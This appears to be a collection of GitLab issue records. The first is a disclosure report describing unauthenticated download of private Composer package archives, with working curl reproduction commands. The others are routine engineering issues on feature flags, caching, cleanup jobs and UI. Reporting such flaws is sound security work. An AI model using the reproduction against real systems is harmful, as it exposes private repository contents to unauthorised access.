Published package: https://gitlab.com/my-private-group3/private-project/-/packages/958076

composer.json  
```json  
{
    "name": "sjerdo/security-test",  
    "authors": [  
        {  
            "name": "Sjoerd Wenker",  
            "email": "sjoerd@relisten.nl"  
        }  
    ],  
    "require": {  
        "sjerdo/private-project": "^1.0"  
    },  
    "repositories": {  
        "gitlab.com/10584961": {  
            "type": "composer",  
            "url": "https://gitlab.com/api/v4/group/10584961/-/packages/composer/packages.json"  
        }  
    }  
}
```

composer.lock:  
```json  
{
    "_readme": [  
        "This file locks the dependencies of your project to a known state",  
        "Read more about it at https://getcomposer.org/doc/01-basic-usage.md#installing-dependencies",  
        "This file is [@]generated automatically"  
    ],  
    "content-hash": "92f07e65c18a1a095eefd9baa735f09f",  
    "packages": [  
        {  
            "name": "sjerdo/private-project",  
            "version": "1.0.0",  
            "dist": {  
                "type": "zip",  
                "url": "https://gitlab.com/api/v4/projects/23533789/packages/composer/archives/sjerdo/private-project.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d",  
                "reference": "76b4344d0ab1491807c8bace4aee112bf09e843d",  
                "shasum": ""  
            },  
            "type": "library"  
        }  
    ],  
    "packages-dev": [],  
    "aliases": [],  
    "minimum-stability": "stable",  
    "stability-flags": [],  
    "prefer-stable": false,  
    "prefer-lowest": false,  
    "platform": [],  
    "platform-dev": [],  
    "plugin-api-version": "2.0.0"  
}
```

dist download URL in composer.json: https://gitlab.com/api/v4/projects/23533789/packages/composer/archives/sjerdo/private-project.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d

Alternative download URL which does require authentication: https://gitlab.com/api/v4/projects/23533789/repository/archive.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d

#####  What is the current *bug* behavior?

When I download the archive without authentication, download is not prohibited.

```zsh  
% curl 'https://gitlab.com/api/v4/projects/23533789/packages/composer/archives/sjerdo/private-project.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d' --output response.zip  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed  
100   709  100   709    0     0   2037      0 --:--:-- --:--:-- --:--:--  2037  
% unzip archive.zip  
   creating: private-project-76b4344d0ab1491807c8bace4aee112bf09e843d-76b4344d0ab1491807c8bace4aee112bf09e843d/  
 extracting: private-project-76b4344d0ab1491807c8bace4aee112bf09e843d-76b4344d0ab1491807c8bace4aee112bf09e843d/composer.json    
```

#####  What is the expected *correct* behavior?

When I download the archive without authentication, download should be prohibited.

```zsh  
% curl 'https://gitlab.com/api/v4/projects/23533789/packages/composer/archives/sjerdo/private-project.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d'  
{"message":"404 Project Not Found"}  
```

#####  Relevant logs and/or screenshots

Publishing the package:  
```zsh  
% curl --data tag=1.0.0 "https://__token__:<TOKEN>[@]gitlab.com/api/v4/projects/23533789/packages/composer"                                        
{"message":"201 Created"}  
```

Alternative URL *does* check authentication:  
```zsh  
% curl 'https://gitlab.com/api/v4/projects/23533789/repository/archive.zip?sha=76b4344d0ab1491807c8bace4aee112bf09e843d'                       
{"message":"404 Project Not Found"}  
```

#####  Output of checks

This bug happens on GitLab.com

######  Results of GitLab environment info

n/a

####  Impact

Attacker can download private repository files without authorization.

## How To Reproduce

Please add [reproducibility information] to this section:

1.
1.
1.

[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues

title: Invalidate ES cache when namespaces moved
description:
Right now we are invalidating project cache when projects are moved from unindexed to indexed namespaces. Investigate if this needs to be done when a child namespace is moved from an unindexed namespace to an indexed namespace. This would only occur when index limiting is enabled for namespaces.

The following discussion from !50712 should be addressed:

- [x] @DylanGriffith started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/50712#note_482251115):  (+2 comments)

    > This appears to be unused. But it makes me think that this may also be needed for a separate caching bug where the child namespaces may be moved from an unindexed to an indexed project and group search may revert to basic search. We don't need to tackle that with this MR as I think it's a separate bug but maybe worth checking and creating an issue about. If we don't need this method in this MR we should take it out until we need it.

title: Remove secret_detection_default_branch job from Secret-Detection
description:
## Description
Let's remove `secret_detection_default_build` from the Secret Detection template. We can move the logic for determining when/how to run the secret detection jobs from `rules` to `script`. This should clear up some of the confusion that comes with having two different secret detection jobs.

This is a breaking change for %14.0

## Related Issues
https://gitlab.com/gitlab-org/gitlab/-/issues/263711

## Tasks
- [x] In the [Secret Detection vendored template](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Security/Secret-Detection.gitlab-ci.yml), consolidate `secret_detection_default_branch` and `secret_detection` into one job, `secret_detection`. Move `rule` logic into `script` which will determine how the `secret_detection` job is ran (historic, on a branch, commits, etc).
- [x] Update Secret Detection documentation

### Release notes 
Draft release notes

description:

### Overview

As determined in the [Think Big session](https://youtu.be/mV9jCk5Znhw) for test coverage and monorepos the next step to validate is if a report of test coverage for a set of files solves the problem an EM has in tracking test coverage for their team within a monorepo.

title: [Feature flag] Rollout of `skip_dag_manual_and_delayed_jobs`
description:
<!-- Title suggestion: [Feature flag] Enable description of feature -->

## What

Remove the `:skip_dag_manual_and_delayed_jobs` feature flag ...

- Feature issue: #281878
- Introduced in: !50765

## Owners

- Team: ~"group::pipeline authoring" 
- Most appropriate slack channel to reach out to: `#g_pipeline-authoring`
- Best individual to reach out to: @furkanayhan 

## Expectations

### What are we expecting to happen?

Copied from the MR:

> When a job needs a skipped job, it needs to be skipped. This bug was [fixed](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/23405) for `when: on_success` jobs (#31526), but not for `when: delayed` and `when: manual`. This MR fixes this.

### What might happen if this goes wrong?

Jobs that need to run may not run. Or, jobs that should not need to run may run.

### What can we monitor to detect problems with this?

Not sure...

## Beta groups/projects

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

- `gitlab-org/gitlab` project
- `gitlab-org`/`gitlab-com` groups
- ...

## Roll Out Steps

- [x] Confirm that QA tests pass with the feature flag enabled (if you're unsure how, contact the relevant [stable counterpart in the Quality department](https://about.gitlab.com/handbook/engineering/quality/#individual-contributors))
- [x] Enable on staging (`/chatops run feature set feature_name true --staging`)
- [x] Test on staging
- [x] Ensure that documentation has been updated
- [x] Enable on GitLab.com for individual groups/projects listed above and verify behaviour  (`/chatops run feature set --project=gitlab-org/gitlab feature_name true`)
- [x] Coordinate a time to enable the flag with the SRE oncall and release managers
  - In `#production` mention `@sre-oncall` and `@release-managers`. Once an SRE on call and Release Manager on call confirm, you can proceed with the rollout
- [x] Announce on the issue an estimated time this will be enabled on GitLab.com
- [x] Enable on GitLab.com by running chatops command in `#production` (`/chatops run feature set feature_name true`)
- [x] Cross post chatops Slack command to `#support_gitlab-com` ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#where-to-run-commands)) and in your team channel
- [x] Announce on the issue that the flag has been enabled
- [x] Add changelog entry
- [x] Remove feature flag
- [x] After the flag removal is deployed, [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel

## Rollback Steps

- [ ] This feature can be disabled by running the following Chatops command:

```
/chatops run feature set --project=gitlab-org/gitlab feature_name false
```

title: Add to UI a simple way to see the Redis HLL events that are triggering
description:
### Problem

It is hard to test if Redis HLL are triggering.

For this we have to connect to staging env and check with ruby code if events are incremented

Code snippet I use for this

```
# Get the current week data, so we catch the events we trigger

start_date = Time.current
end_date = Time.current+1.week

::Gitlab::UsageDataCounters::HLLRedisCounter.known_events.each{|a| puts({ a["name"] => Gitlab::UsageDataCounters::HLLRedisCounter
.unique_events(event_names: a["name"], start_date: start_date , end_date: end_date) }) };

```

### Proposal

* Have a way to see this in UI for staging and development environments. 

Maybe add them to performance bar or have a separate tracking bar/witget.

cc @gitlab-org/growth/product-intelligence

title: Spike - allow need to refer to a job in the same stage
description:
This Spike had originated from https://gitlab.com/gitlab-org/gitlab/-/issues/30632

Following our Verify technical discussion, we'd agreed to conduct a time-boxed POC where we will allow to depend on the jobs within the same stage instead of this being prevented by an error.

The expected result should not be a production-ready solution but a POC which will help us uncover some unknowns and complexity this feature might introduce

#### Limitations

* Circular references will need to be detected and will still result in an error.
* `dependencies:` will not be updated to support this (at least as part of this issue) separate from within the context of `needs` since non-DAG pipelines having dependencies on something in the same stage is undefined.
* Visualization will not be supported, however, we should collaborate with Frontend team to better understand the needed work to have this ready, however there is no expectation that a frontend work is needed

title: Create a database cleanup for ci_test_cases and ci_test_case_failures
description:
### Overview

These tables will grow indefinitely and slow down page performance for the the MR and/or test summary widget of not pruned occasionally.

Currently the table is new, after 24 hours on GitLab dot com it grew to ~10,000 rows. Given that pace, we likely have a few months to act, but we should get this squared away.

### Proposal

* Create a cleanup job to delete data from projects that have been deleted (set to delete and past the delay you can save it in)
* Create a cleanup job that deletes data more than 28 days old (around 1 month) which is twice what we display today so gives us some ability to extend the window for users.
* Looking into the DB schema, I assume that we're planning to use the `ci_test_case_failures.failed_at` column to determine the cleanup period (28 days). If we add an index to this column, then we can clean records up in batches efficiently.
* Perhaps it's worth looking at the [`Ci::DeleteObjectsWorker`](https://gitlab.com/gitlab-org/gitlab/blob/4c47446b77b39d092ce4f3467d6e0cd9cdb2e44d/app/workers/ci/delete_objects_worker.rb#L4). It uses the [`LimitedCapacity::Worker`](https://docs.gitlab.com/ee/development/sidekiq_style_guide.html#limited-capacity-worker) to go through batches of rows and delete them.
Example for batch delete (pseudo code):

```ruby
# delete 1K items until we have nothing left to delete
loop do
  result = execute("DELETE FROM ci_test_case_failures WHERE id IN (SELECT id FROM ci_test_case_failures WHERE failed_at > '28days ago' LIMIT 1000)")
  break if result.count == 0 # no more items to delete
end
```
 (From https://gitlab.com/gitlab-org/gitlab/-/issues/268249#note_484539212)
### Questions
* Are there other table cleanup jobs we can base this off of?
* When should we get the ~3098698  team involved?

title: Refactor user_edits_multiple_reviewers_mr_spec.rb to get rid of duplicate code
description:
The following discussion from !46738 should be addressed:

- [ ] @sming-gitlab started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/46738#note_466721516):  (+1 comment)

    > You will notice this is a duplicate of line 15-16; so you might be wondering, why not combine it like so:
    > 
    > ![image](/uploads/12189e90bbc26e05524d2a75ba080906/image.png)

    > That's exactly what I tried but it failed :sob: For some odd reason, the `reviewer_approval_rules: false` just wouldn't kick in. So the `gon.featuresApprovalRules` continued to be `true` instead of `false`.
    > 
    > ![image](/uploads/4a7e6410e0a3018997fa631314b8f12b/image.png)

## Suggested Solution

> @mlapierre: That's weird. There are plenty of tests with `stub_feature_flags` in a nested context. I wonder what's going on? :thinking:

> 
> Here's a fix:
> 
> ```diff
> diff --git a/ee/spec/features/merge_request/user_edits_multiple_reviewers_mr_spec.rb b/ee/spec/features/merge_request/user_edits_multiple_reviewers_mr_spec.rb
> index b6049d8d794..a6765844e65 100644

> +++ b/ee/spec/features/merge_request/user_edits_multiple_reviewers_mr_spec.rb
> @@ -32,22 +32,21 @@
>          expect(page).to have_content(rule_name)
>        end
>      end
> -  end
>  
> -  context 'when reviewer_approval_rules feature flag off' do
> -    let(:rule_name) { 'some-custom-rule' }
> -    let!(:mr_rule) { create(:approval_merge_request_rule, merge_request: merge_request, users: [user], name: rule_name, approvals_required: 1 )}
> +    context 'when reviewer_approval_rules feature flag off' do
> +      before do
> +        stub_feature_flags(reviewer_approval_rules: false)
>  
> -    before do
> -      stub_feature_flags(reviewer_approval_rules: false)
> -    end
> +        visit edit_project_merge_request_path(target_project, merge_request)
> +      end
>  
> -    it 'is not shown in reviewer dropdown' do
> -      find('.js-reviewer-search').click
> -      wait_for_requests
> +      it 'is not shown in reviewer dropdown' do
> +        find('.js-reviewer-search').click
> +        wait_for_requests
>  
> -      page.within '.dropdown-menu-reviewer' do
> -        expect(page).not_to have_content(rule_name)
> +        page.within '.dropdown-menu-reviewer' do
> +          expect(page).not_to have_content(rule_name)
> +        end
>        end
>      end
>    end
> ```

title: Remove the `:geo_nodes_beta` feature flag
description:
<!-- Title suggestion: [Feature flag] Enable description of feature -->

## What

Remove the `:geo_nodes_beta` feature flag, redirect route temporarily, and remove legacy code.

## Owners

- Team: @geo-team 
- Most appropriate slack channel to reach out to: `#g_geo`
- Best individual to reach out to: @zcuddy

## Expectations

### What are we expecting to happen?

Expectation is after the Feature Flag validations are done and https://gitlab.com/gitlab-org/gitlab/-/issues/287979 has been closed we will be ready for the cutover.  This will entail:
1. Deleting all the legacy `geo_nodes` namespace UI code.
2. Redirecting the `admin/geo/nodes` route to the `geo_nodes_beta` UI temporarily => https://gitlab.com/gitlab-org/gitlab/-/issues/327645
3. Remove feature flag.

### What might happen if this goes wrong?

If something goes wrong, users may start seeing incorrect data representation of their Geo Nodes. We plan on doing 2 rounds of regression testing as well as knowledge that in the case of emergency Geo can be managed from the command line and all the customer's backend services will be unaffected.

### What can we monitor to detect problems with this?

We plan to implement opportunities for user feedback from our Geo customers. 

## Beta groups/projects

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

- `gitlab-org/gitlab` project

## Roll Out Steps

- [ ] Confirm that QA tests pass with the feature flag enabled (if you're unsure how, contact the relevant [stable counterpart in the Quality department](https://about.gitlab.com/handbook/engineering/quality/#individual-contributors))
- [ ] Enable on staging (`/chatops run feature set feature_name true --staging`)
- [ ] Test on staging
- [ ] Ensure that documentation has been updated
- [ ] Enable on GitLab.com for individual groups/projects listed above and verify behaviour  (`/chatops run feature set --project=gitlab-org/gitlab feature_name true`)
- [ ] Coordinate a time to enable the flag with the SRE oncall and release managers
  - In `#production` mention `@sre-oncall` and `@release-managers`. Once an SRE on call and Release Manager on call confirm, you can proceed with the rollout
- [ ] Announce on the issue an estimated time this will be enabled on GitLab.com
- [ ] Enable on GitLab.com by running chatops command in `#production` (`/chatops run feature set feature_name true`)
- [ ] Cross post chatops Slack command to `#support_gitlab-com` ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#where-to-run-commands)) and in your team channel
- [ ] Announce on the issue that the flag has been enabled
- [ ] Remove feature flag and add changelog entry
- [ ] After the flag removal is deployed, [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel

## Rollback Steps

- [ ] This feature can be disabled by running the following Chatops command:

```
/chatops run feature set --project=gitlab-org/gitlab feature_name false
```

title: Offset-based pagination not working for compare commits api
description:
### Summary Compare api for commit is not returning response page by page when using Offset-based pagination parameters ### Steps to reproduce Invoke endpoint GET /projects/:id/repository/compare to compare two commits that are more than 20 commits apart, and use parameters page=1&per_page=20 Example REST endpoint - https://gitlab.com/api/v4/projects/18/repository/compare?page=1&per_page=20&from=&to= ### Example Project ### What is the current *bug* behavior? Compare api endpoint returns all the commits diff in response even when offset-based pagination parameters are used ### What is the expected *correct* behavior? Compare api should return response page by page when offset-based pagination parameters are used ### Relevant logs and/or screenshots ### Output of checks #### Results of GitLab environment info
Expand for output related to GitLab environment info 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)
#### Results of GitLab application Check
Expand for output related to the GitLab application check 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:check SANITIZE=true`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)

(we will only investigate if the tests are passing)
### Possible fixes

title: UI should explain if no junit report artifacts are available to populate unit test report
description:
### Release notes When examining an old pipeline, there is no indication that a job's artifacts are expired, and we only include `There are no test cases to display` as empty state text. We will add clarifying text that the artifacts are expired and that is why the test report is empty. ### Problem to solve The Unit Test report utilizes `BuildReportResult` to populate the summary data. This results in top level data (total tests ran, passed, failed, etc.) but no details present when artifacts are expired. As a Developer looking at an old pipeline, I want some visual indicator that test results are expired on the Unit Test report, so that I don't wait a bunch of time figuring it out myself and can move on. ![image](https://gitlab.com/gitlab-org/gitlab/uploads/ee6da5f88acfc65de11839fad60b4d29/image.png) ![Screen_Shot_2022-02-02_at_2.11.53_PM](/uploads/e4169c4842edd8d0b8356fb9ddd64dca/Screen_Shot_2022-02-02_at_2.11.53_PM.png) Example Project: https://gitlab.com/gitlab-org/gitlab-runner/-/pipelines/221552771/test_report ### Intended users * [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer) * [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer) ### Metrics ### User experience goal Clarify why the test case is empty through additional empty state text. ### Proposal Add to the text `There are no test cases to display.` additional text on the Unit Test -> Job view when the artifact that would populate the view is expired: `Test details are populated by job artifacts. The job artifacts from this pipeline are expired.` #### ~UX 🎨 [Designs in design management](https://gitlab.com/gitlab-org/gitlab/-/issues/296963/designs/Pipelines-Test-Details.png) - Add an empty state to the page with the following text: Title: Job artifacts are expired. Description: Test reports require job artifacts but all artifacts are expired. [Learn more.](https://docs.gitlab.com/ee/ci/unit_test_reports.html#viewing-unit-test-reports-on-gitlab) #### ~backend ```diff --- a/app/controllers/projects/pipelines/tests_controller.rb +++ b/app/controllers/projects/pipelines/tests_controller.rb @@ -23,7 +23,11 @@ def show format.json do render json: TestSuiteSerializer .new(project: project, current_user: @current_user) - .represent(test_suite, details: true) + .represent( + test_suite, + details: true, + artifacts_expired: expired_artifacts? + ) end end end @@ -35,6 +39,10 @@ def builds @builds ||= pipeline.latest_builds.id_in(build_ids).presence || render_404 end + # Memoize this call + def expired_artifacts? + !pipeline.has_reports?(::Ci::JobArtifact.test_reports.not_expired) + end + def build_ids return [] unless params[:build_ids] diff --git a/app/serializers/test_suite_entity.rb b/app/serializers/test_suite_entity.rb index 15eb2891b22..55590ad24e8 100644 --- a/app/serializers/test_suite_entity.rb +++ b/app/serializers/test_suite_entity.rb @@ -15,5 +15,9 @@ class TestSuiteEntity < Grape::Entity expose :test_cases, using: TestCaseEntity do |test_suite| test_suite.suite_error ? [] : test_suite.sorted.test_cases.values.flat_map(&:values) end + + expose :artifacts_expired do |test_suite, opts| + opts[:artifacts_expired] + end ``` ~frontend ```diff diff --git a/app/assets/javascripts/pipelines/components/test_reports/test_suite_table.vue b/app/assets/javascripts/pipelines/components/test_reports/test_suite_table.vue index 51373e712ff..f4039038f8a 100644 --- a/app/assets/javascripts/pipelines/components/test_reports/test_suite_table.vue +++ b/app/assets/javascripts/pipelines/components/test_reports/test_suite_table.vue @@ -35,10 +35,13 @@ export default { }, computed: { ...mapState(['pageInfo']), - ...mapGetters(['getSuiteTests', 'getSuiteTestCount']), + ...mapGetters(['getSuiteTests', 'getSuiteTestCount', 'getSuiteArtifactsExpired']), hasSuites() { return this.getSuiteTests.length > 0; }, + artifactsExpired() { + return this.getSuiteArtifactsExpired; + }, }, methods: { ...mapActions(['setPage']), @@ -158,6 +161,13 @@ export default {

{{ s__('TestReports|There are no test cases to display.') }}

+

+ {{ + s__( + 'TestReports|Test details are populated by job artifacts. The job artifacts from this pipeline are expired.', + ) + }} +

diff --git a/app/assets/javascripts/pipelines/stores/test_reports/getters.js b/app/assets/javascripts/pipelines/stores/test_reports/getters.js index 03680de0fa9..43f7432f12e 100644 --- a/app/assets/javascripts/pipelines/stores/test_reports/getters.js +++ b/app/assets/javascripts/pipelines/stores/test_reports/getters.js @@ -28,4 +28,9 @@ export const getSuiteTests = (state) => { .slice(start, start + perPage); }; +export const getSuiteArtifactsExpired = (state) => { + const { artifacts_expired: artifactsExpired = false } = getSelectedSuite(state); + return artifactsExpired; +}; + export const getSuiteTestCount = (state) => getSelectedSuite(state)?.test_cases?.length || 0; ``` ### Further details ### Permissions and Security ### Documentation ### Availability & Testing ### Available Tier ### What does success look like, and how can we measure that? Less confusion around expired artifacts and why a test report is empty. ### What is the type of buyer? ### Is this a cross-stage feature? ### Links / references *This page may contain information related to upcoming products, features and functionality. It is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes. Just like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*

title: Container Registry Details: split details from tags call to reduce LCP
description:
In the container registry details page, the whole UI is gated behind a skeleton loader.

Similarly to the list page we could speed up the header part to be shown if we separate our query in two pieces:

- Load all the data
- Load the tags

From a rapid test in a local environment it's visible that if we remove `tags` form the query the results are ready in half of the time (280ms)

While loading details plus tags takes around `560ms` this is because for each tag rails is doing 3 requests to the container registry.

Doing like this will make the page first load the header and populate it, while the skeleton loader for the tags is still shown, and when the tags are ready show the tags.

title: Display Compliance Framework disabled field for Maintainers (FE)
description:
### Problem to solve

Starting with https://gitlab.com/gitlab-org/gitlab/-/merge_requests/50441, the `Compliance framework` field is no longer displayed for project maintainers. [It was decided](https://gitlab.com/gitlab-org/gitlab/-/issues/276221#note_481080085) to ship this change in %13.8 and revisit the refactoring work in 13.9%

### Proposal

- Display the `Compliance framework` field as disabled for Maintainers. 
- Add help text [Customizable by owners.]() linking to documentation.

### Design 

![Text](/uploads/fbbcbbe759cc8f694f9b061204e3d75a/Text.png)

| selected | empty |
| ------ | ------ |
| ![image](/uploads/b3b7dbd587fef2779e750514b0cdac73/image.png) | ![image](/uploads/268a387b04f4977b8a7ba0ef51190a2c/image.png) |

### Implementation plan

~frontend - `1`

1. Update `ee/app/views/compliance_management/compliance_framework/_project_settings.html.haml` to remove the instant return and move to the wrapping `- else` and inside the `Feature.enabled?(:ff_custom_compliance_frameworks)` block
2. If `current_user.can?(:admin_compliance_framework, @project)` then show the dropdown
3. Otherwise, show a disabled input field without the description and `(optional)` suffix
4. If no framework has been chosen already for this project, show `None` where a value would be
6. Update tests to check the right field is shown (with the right values) depending on each scenario

Separate MR:

1. Limit the total length to `80` characters with an ellipsis (for disabled and enabled fields)

title: Add filter capability to Group Migration page (frontend)
description:
## Problem to solve
For users who have access to many groups, the experience of having to look through a long list to find the one that they want to migrate is not a great experience. 

## Proposal
Provide the user the ability to search groups on the `Import Groups` page. Add functionality similar to the search behavior found on the `Import Projects` page. See attached screenshot for layout.

**Use the [search-box-by-click-v-model](https://design.gitlab.com/components/search/#search-by-confirmation) Pajamans UI component.**

![Import-filter](/uploads/99b6dc5ad6022ff4c1fea07ee8f0ec2d/Import-filter.jpg)
Related issue: #241662 (backend)

description:

title: Container and Package List UI Polish - Condense spacing to match Issues
description:
### Release notes

Design is very important to us at GitLab. We all have to work in the app throughout the day, so why not make it a pleasant experience. You know what's not pleasant, inconsistent design. You may have noticed that the spacing in the Package and Container registries is different than the rest of the app. And if you are like us, it made your eye twitch a little. 

Well, we have addressed that. You can now rest assured that you will not see inconsistent spacing when viewing your registries. 

### Problem to solve 

The spacing between each line of a list item in the Container Registry and Package registry is too large, especially when compared with the issues list item example.
